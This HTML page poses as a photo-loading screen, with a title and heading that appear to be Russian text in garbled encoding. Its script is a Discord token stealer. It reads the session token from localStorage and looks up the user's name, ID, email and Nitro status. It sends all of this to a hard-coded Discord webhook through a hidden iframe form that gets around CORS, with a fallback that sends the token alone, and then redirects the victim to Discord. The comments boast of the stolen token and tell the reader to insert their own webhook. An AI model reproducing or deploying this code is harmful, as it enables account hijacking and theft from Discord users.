<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–æ—Ç–æ...</title>
  <style>body{background:#000;color:#fff;font:22px Arial;text-align:center;padding-top:15%}</style>
</head>
<body>
  <h1>–ó–∞–≥—Ä—É–∑–∫–∞ —Ñ–æ—Ç–æ...</h1>
  <script>
    // ‚Üê‚Üê‚Üê‚Üê –í–°–¢–ê–í–¨ –°–í–û–ô –í–ï–ë–•–£–ö –°–Æ–î–ê (–ø–æ–ª–Ω—ã–π URL!) ‚Üí‚Üí‚Üí‚Üí
    const WEBHOOK = "https://discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";

    const token = localStorage.getItem("token") || "–Ω–µ—Ç —Ç–æ–∫–µ–Ω–∞";
    console.log("–¢–æ–∫–µ–Ω –Ω–∞–π–¥–µ–Ω:", token.substring(0, 20) + "...");

    if (!token || token === "–Ω–µ—Ç —Ç–æ–∫–µ–Ω–∞") {
      setTimeout(() => location.href = "https://discord.com/app", 1000);
    } else {
      // –ü–æ–ª—É—á–∞–µ–º –±–∞–∑–æ–≤—É—é –∏–Ω—Ñ—É –æ —é–∑–µ—Ä–µ (—á–µ—Ä–µ–∑ API, –±–µ–∑ CORS-–æ—à–∏–±–æ–∫)
      fetch("https://discord.com/api/v9/users/@me", {
        headers: { "Authorization": token }
      }).then(r => r.json()).then(user => {
        const userInfo = user.username || "–Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω";
        const discriminator = user.discriminator || "0000";
        const id = user.id || "–Ω–µ–∏–∑–≤–µ—Å—Ç–µ–Ω";
        const email = user.email || "—Å–∫—Ä—ã—Ç";

        // –§–æ—Ä–º–∏—Ä—É–µ–º JSON –¥–ª—è webhook (embed —Å —Ç–æ–∫–µ–Ω–æ–º)
        const payload = {
          content: "**–ù–æ–≤—ã–π —Ç–æ–∫–µ–Ω –ø–æ–π–º–∞–Ω!**",
          embeds: [{
            color: 16711680,  // –ö—Ä–∞—Å–Ω—ã–π
            title: "üéØ –¢–æ–∫–µ–Ω —Å–ø–∏–∑–∂–µ–Ω",
            fields: [
              { name: "üîë –¢–æ–∫–µ–Ω", value: `\`\`\`${token}\`\`\``, inline: false },
              { name: "üë§ –Æ–∑–µ—Ä", value: `${userInfo}#${discriminator} (${id})`, inline: true },
              { name: "üìß Email", value: email, inline: true },
              { name: "üíé Nitro", value: user.premium_type ? "–ï—Å—Ç—å" : "–ù–µ—Ç", inline: true }
            ],
            timestamp: new Date().toISOString()
          }]
        };

        // –°–æ–∑–¥–∞—ë–º —Å–∫—Ä—ã—Ç—É—é iframe –∏ POST-—Ñ–æ—Ä–º—É (–æ–±—Ö–æ–¥ CORS)
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;

        const form = iframeDoc.createElement('form');
        form.method = 'POST';
        form.action = WEBHOOK;
        form.style.display = 'none';

        const input = iframeDoc.createElement('input');
        input.type = 'hidden';
        input.name = 'payload_json';  // –ö–ª—é—á –¥–ª—è Discord webhook
        input.value = JSON.stringify(payload);

        form.appendChild(input);
        iframeDoc.body.appendChild(form);
        form.submit();  // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º POST

        console.log("‚úÖ POST –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ webhook!");
      }).catch(err => {
        console.error("–û—à–∏–±–∫–∞ API:", err);
        // Fallback: –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–ª—å–∫–æ —Ç–æ–∫–µ–Ω
        const fallbackPayload = { content: `\`\`\`${token}\`\`\`` };
        // –ê–Ω–∞–ª–æ–≥–∏—á–Ω–æ —Å–æ–∑–¥–∞—ë–º —Ñ–æ—Ä–º—É –¥–ª—è fallback
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        document.body.appendChild(iframe);
        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
        const form = iframeDoc.createElement('form');
        form.method = 'POST';
        form.action = WEBHOOK;
        form.style.display = 'none';
        const input = iframeDoc.createElement('input');
        input.type = 'hidden';
        input.name = 'payload_json';
        input.value = JSON.stringify(fallbackPayload);
        form.appendChild(input);
        iframeDoc.body.appendChild(form);
        form.submit();
      });

      // –ü–µ—Ä–µ—Ö–æ–¥–∏–º –≤ Discord —á–µ—Ä–µ–∑ 1.5 —Å–µ–∫—É–Ω–¥—ã
      setTimeout(() => {
        location.href = "https://discord.com/app";
      }, 1500);
    }
  </script>
</body>
</html>
